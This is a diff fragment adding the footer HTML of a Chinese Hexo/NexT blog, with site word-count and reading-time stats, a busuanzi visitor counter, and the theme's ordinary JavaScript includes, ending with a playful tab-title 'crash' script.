+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">21k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">19 分钟</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
+<!--崩溃欺骗-->
+<script type="text/javascript" src="/js/crash_cheat.js"></script>
